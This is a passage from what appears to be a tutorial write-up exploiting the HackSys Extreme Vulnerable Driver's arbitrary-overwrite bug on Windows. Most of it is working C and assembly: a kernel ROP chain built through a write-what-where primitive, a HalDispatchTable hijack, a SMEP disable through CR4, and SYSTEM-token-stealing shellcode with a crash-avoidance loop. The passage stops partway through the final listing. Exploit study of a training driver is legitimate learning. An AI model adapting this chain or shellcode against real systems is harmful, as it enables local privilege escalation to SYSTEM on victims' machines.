<p>By using a seemingly unused read/writable location in the data section of <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">ntoskrnl.exe</span>, we can simply use this as our new custom stack location.</p>

<p><img src="/images/Pasted%20image%2020230710205647.png" alt="" /></p>

<p><img src="/images/Pasted%20image%2020230710205717.png" alt="" /></p>

<p>We can now implement these gadgets into our code so we can effectively start writing our ROP chain.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LPCSTR</span> <span class="n">FileName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">DEVICE_NAME</span><span class="p">;</span>

	<span class="c1">// Get the kernel base address</span>
	<span class="n">PVOID</span> <span class="n">KernelBase</span> <span class="o">=</span> <span class="n">GetKernelBase</span><span class="p">();</span>

	<span class="c1">// Get the HalDispatchTable address</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetHalDispatchTable</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">);</span>

	<span class="c1">// Get the HaliQuerySystemInformationAddress address</span>
	<span class="n">PVOID</span> <span class="n">HaliQuerySystemInformationAddress</span> <span class="o">=</span> <span class="n">GetHaliQuerySystemInformation</span><span class="p">(</span><span class="n">HalDispatchTable</span><span class="p">);</span>

	<span class="c1">// Create some distance between the RSI offset and our final buffer.</span>
	<span class="n">PVOID</span> <span class="n">RsiBufferLocation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0xCE9598</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">);</span>

	<span class="c1">// Location of the RSI gadget</span>
	<span class="n">PVOID</span> <span class="n">RsiGadgetLocation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">RsiBufferLocation</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">);</span>

	<span class="c1">// Set the final buffer (ROP chain) location</span>
	<span class="n">PVOID</span> <span class="n">BufferLocation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0xCE9598</span><span class="p">);</span>


	<span class="kr">__try</span> <span class="p">{</span>
		<span class="c1">// Get the device handle</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Getting Device Driver Handle</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Device Name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">FileName</span><span class="p">);</span>

		<span class="n">hFile</span> <span class="o">=</span> <span class="n">GetDeviceHandle</span><span class="p">(</span><span class="n">FileName</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed Getting Device Handle: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
			<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Device Handle: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="c1">// Overwrite HalDispatchTable entry with our first gadget</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HaliQuerySystemInformationAddress</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x434f8d</span><span class="p">));</span> <span class="c1">// push qword[rbx]; jmp qword[rsi + 0x39]; (1 found)</span>

		<span class="c1">// Take control over the stack in our second gadget</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">RsiGadgetLocation</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5b784e</span><span class="p">));</span> <span class="c1">// pop rsp; ret; (1 found)</span>

		<span class="c1">// Prepare our ROP chain</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">BufferLocation</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5bee0c</span><span class="p">));</span> <span class="c1">// int3; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5bee0c</span><span class="p">));</span> <span class="c1">// int3; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5bee0c</span><span class="p">));</span> <span class="c1">// int3; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5bee0c</span><span class="p">));</span> <span class="c1">// int3; ret; (1 found)</span>
		
		<span class="c1">// Set RSI to the RsiBufferLocation</span>
		<span class="n">SetRSI</span><span class="p">(</span><span class="n">RsiBufferLocation</span><span class="p">);</span>

		<span class="k">typedef</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)(</span><span class="n">PVOID</span> <span class="n">arg0</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">arg1</span><span class="p">);</span>
		<span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">));</span>
		<span class="n">PtrNtQueryIntervalProfile</span> <span class="n">_NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get address of NtQueryIntervalProfile.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="n">_NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">BufferLocation</span><span class="p">);</span>

	<span class="p">}</span>
	<span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Exception: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can verify we have moved the stack pointer to our new ‘custom stack’ where we have written our <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">INT3</span> gadgets, which we can now step through!</p>

<p><img src="/images/Pasted%20image%2020230710210800.png" alt="" /></p>

<h2 id="disabling-smep-using-rop">Disabling SMEP using ROP</h2>
<p>Now that we are able to build and execute a ROP chain, we can use this chain in order to disable SMEP and execute our shellcode. Remember, SMEP is enforced through the 20th bit in the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">CR4</span> register, so all we have to do is flip this bit.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Disable SMEP</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x51b5f5</span><span class="p">));</span> <span class="c1">// pop rcx; ret; (1 found)</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="mh">0x250ef8</span><span class="p">);</span> <span class="c1">// Cr4 with SMEP disabled</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x9a63e3</span><span class="p">));</span> <span class="c1">// mov cr4, rcx; ret; (1 found)</span>
</code></pre></div></div>

<p>Along with setting the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">CR4</span> register, we can fix the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable</span> value we have overwritten by finding the offset and writing that to the original location.</p>

<p><img src="/images/Pasted%20image%2020230714133406.png" alt="" /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Restore HaliQuerySystemInformation</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x57adf1</span><span class="p">));</span> <span class="c1">// pop rcx; ret; (1 found)</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x098f9d0</span><span class="p">));</span> <span class="c1">// Address of the HaliQuerySystemInformation function</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5e602d</span><span class="p">));</span> <span class="c1">// pop rdx; ret; (1 found)</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">HaliQuerySystemInformationAddress</span><span class="p">);</span> <span class="c1">// Location where HaliQuerySystemInformation should be</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x7567b8</span><span class="p">));</span> <span class="c1">// xor eax, eax; mov qword[rdx], rcx; ret; (1 found)</span>
</code></pre></div></div>

<p>Next we can simply return into a <strong>userland</strong> executable buffer in order to execute shellcode.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Exec shellcode</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">ShellcodeBuffer</span><span class="p">);</span> <span class="c1">// Jump to our shellcode</span>
</code></pre></div></div>

<p>This allows us to continue execution in our <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">ShellcodeBuffer</span>. In order to write shellcode I will be using <a href="https://learn.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-170">MASM</a>, which allows you to link functions written in assembly.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="kt">int</span> <span class="n">shellcode_buf</span><span class="p">;</span>
</code></pre></div></div>

<p><strong>shellcode.asm</strong></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.code</span>
<span class="nf">shellcode_buf</span> <span class="nv">PROC</span>
    <span class="nf">mov</span>  <span class="nb">rax</span><span class="p">,</span> <span class="nb">gs</span><span class="p">:[</span><span class="mh">0188h</span><span class="p">]</span>   <span class="c1">; _KTHREAD</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span>  <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span> <span class="o">+</span> <span class="mh">0b8h</span><span class="p">]</span>   <span class="c1">; Current _EPROCESS</span>
    <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rax</span>      <span class="c1">; Copy _EPROCESS to rbx</span>
    <span class="nl">__loop:</span>
      <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbx</span> <span class="o">+</span> <span class="mh">0448h</span><span class="p">]</span>    <span class="c1">; Go to next process through ActiveProcessLinks</span>
      <span class="nf">sub</span> <span class="nb">rbx</span><span class="p">,</span> <span class="mh">0448h</span>        <span class="c1">; Go back to current process (_EPROCESS)</span>
      <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbx</span> <span class="o">+</span> <span class="mh">0440h</span><span class="p">]</span>    <span class="c1">; Grab the PID</span>
      <span class="nf">cmp</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">04h</span>      <span class="c1">; Check if PID matches SYSTEM PID</span>
      <span class="nf">jnz</span> <span class="nv">__loop</span>      <span class="c1">; If not SYSTEM PID, jmp to __loop</span>

    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbx</span> <span class="o">+</span> <span class="mh">04b8h</span><span class="p">]</span>    <span class="c1">; Grab the SYSTEM token</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">rax</span> <span class="o">+</span> <span class="mh">04b8h</span><span class="p">],</span> <span class="nb">rcx</span>    <span class="c1">; Copy SYSTEM token to current process</span>
    <span class="nf">ret</span>
  
<span class="nf">shellcode_buf</span> <span class="nv">ENDP</span>
<span class="nf">END</span>
</code></pre></div></div>

<p>Running the exploit with the above shellcode, we can confirm that we have successfully stolen the SYSTEM token!</p>

<p><img src="/images/Pasted%20image%2020230711221057.png" alt="" /></p>

<p>There is one caveat however, if we continue the execution we will get a BSOD because the kernel will not be able to properly continue execution. In order to actually use our new token we need a method so that the kernel will not crash once we continue after our exploit.</p>

<h2 id="preventing-a-bsod">Preventing a BSOD</h2>
<p>A BSOD happens due to some exception in the kernel. One method of preventing such an exception is to simply never allow the thread to hit any exception-triggering code by triggering an infinite loop. This is not the cleanest method, but definitely one of the easier ones.</p>

<p>In order to trigger an infinite loop, we can store a <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">JMP RAX</span> gadget which we will jump to from inside of our shellcode.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Store the JMP RAX</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5e602d</span><span class="p">));</span> <span class="c1">// pop rdx; ret; (1 found)</span>
<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x523fe0</span><span class="p">));</span> <span class="c1">// jmp rax ; (1 found)</span>
</code></pre></div></div>

<p>Inside of our shellcode, we will wipe the ROP chain we have just created, and trigger the infinite loop by storing the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">JMP RAX</span> gadget in <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RAX</span> and jumping to it.</p>

<p><strong>shellcode.asm</strong></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.code</span>
<span class="nf">shellcode_buf</span> <span class="nv">PROC</span>
    <span class="nf">mov</span>  <span class="nb">rax</span><span class="p">,</span> <span class="nb">gs</span><span class="p">:[</span><span class="mh">0188h</span><span class="p">]</span>   <span class="c1">; _KTHREAD</span>
    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span>  <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span> <span class="o">+</span> <span class="mh">0b8h</span><span class="p">]</span>   <span class="c1">; Current _EPROCESS</span>
    <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rax</span>      <span class="c1">; Copy _EPROCESS to rbx</span>
    <span class="nl">__loop:</span>
        <span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbx</span> <span class="o">+</span> <span class="mh">0448h</span><span class="p">]</span>    <span class="c1">; Go to next process through ActiveProcessLinks</span>
        <span class="nf">sub</span> <span class="nb">rbx</span><span class="p">,</span> <span class="mh">0448h</span>        <span class="c1">; Go back to current process (_EPROCESS)</span>
        <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbx</span> <span class="o">+</span> <span class="mh">0440h</span><span class="p">]</span>    <span class="c1">; Grab the PID</span>
        <span class="nf">cmp</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">04h</span>      <span class="c1">; Check if PID matches SYSTEM PID</span>
        <span class="nf">jnz</span> <span class="nv">__loop</span>      <span class="c1">; If not SYSTEM PID, jmp to __loop</span>

    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbx</span> <span class="o">+</span> <span class="mh">04b8h</span><span class="p">]</span>    <span class="c1">; Grab the SYSTEM token</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">rax</span> <span class="o">+</span> <span class="mh">04b8h</span><span class="p">],</span> <span class="nb">rcx</span>    <span class="c1">; Copy SYSTEM token to current process</span>

   <span class="c1">; Wipe our ROPchain</span>
   <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">010h</span>
    <span class="nl">__wiper_loop:</span>
        <span class="nf">and</span> <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">0</span><span class="p">],</span> <span class="mi">0</span>
        <span class="nf">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">08h</span>
        <span class="nf">dec</span> <span class="nb">rcx</span>
        <span class="nf">cmp</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mi">0</span>
        <span class="nf">jnz</span> <span class="nv">__wiper_loop</span>

    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span> <span class="c1">; Get the jmp rax gadget in rax</span>
    <span class="nf">mov</span> <span class="nb">rsp</span><span class="p">,</span> <span class="nb">rbp</span> <span class="c1">; Fix our stack pointer to the original value</span>
    <span class="nf">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0118h</span>
    <span class="nf">jmp</span> <span class="nb">rax</span> <span class="c1">; Start the infinite loop</span>

<span class="nf">shellcode_buf</span> <span class="nv">ENDP</span>
<span class="nf">END</span>
</code></pre></div></div>

<p><strong>HEVD_ArbitraryOverwrite.c</strong></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">ThreadFunc</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">Sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
	<span class="n">WinExec</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LPCSTR</span> <span class="n">FileName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">DEVICE_NAME</span><span class="p">;</span>

	<span class="c1">// Get the kernel base address</span>
	<span class="n">PVOID</span> <span class="n">KernelBase</span> <span class="o">=</span> <span class="n">GetKernelBase</span><span class="p">();</span>

	<span class="c1">// Get the HalDispatchTable address</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetHalDispatchTable</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">);</span>

	<span class="c1">// Get the HaliQuerySystemInformationAddress address</span>
	<span class="n">PVOID</span> <span class="n">HaliQuerySystemInformationAddress</span> <span class="o">=</span> <span class="n">GetHaliQuerySystemInformation</span><span class="p">(</span><span class="n">HalDispatchTable</span><span class="p">);</span>

	<span class="c1">// Create some distance between the RSI offset and our final buffer.</span>
	<span class="n">PVOID</span> <span class="n">RsiBufferLocation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0xCE9598</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">);</span>

	<span class="c1">// Location of the RSI gadget</span>
	<span class="n">PVOID</span> <span class="n">RsiGadgetLocation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">RsiBufferLocation</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">);</span>

	<span class="c1">// Set the final buffer (ROP chain) location</span>
	<span class="n">PVOID</span> <span class="n">BufferLocation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0xCE9598</span><span class="p">);</span>

	<span class="n">HANDLE</span> <span class="n">execthread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ThreadFunc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>


	<span class="kr">__try</span> <span class="p">{</span>
		<span class="c1">// Get the device handle</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Getting Device Driver Handle</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Device Name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">FileName</span><span class="p">);</span>

		<span class="n">hFile</span> <span class="o">=</span> <span class="n">GetDeviceHandle</span><span class="p">(</span><span class="n">FileName</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed Getting Device Handle: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
			<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Device Handle: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x8</span><span class="p">;</span>


		<span class="n">PVOID</span> <span class="n">ShellcodeBuffer</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ShellcodeBuffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to allocate buffer for shellcode"</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="n">memcpy</span><span class="p">(</span><span class="n">ShellcodeBuffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

		<span class="c1">// Overwrite HalDispatchTable entry with our first gadget</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HaliQuerySystemInformationAddress</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x434f8d</span><span class="p">));</span> <span class="c1">// push qword[rbx]; jmp qword[rsi + 0x39]; (1 found)</span>

		<span class="c1">// Take control over the stack in our second gadget</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">RsiGadgetLocation</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5b784e</span><span class="p">));</span> <span class="c1">// pop rsp; ret; (1 found)</span>

		<span class="c1">// Prepare our ROP chain</span>
		<span class="c1">// Disable SMEP</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x51b5f5</span><span class="p">));</span> <span class="c1">// pop rcx; ret; (1 found)</span>
		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">+</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">),</span> <span class="mh">0x250ef8</span><span class="p">);</span> <span class="c1">// Cr4 with SMEP disabled</span>
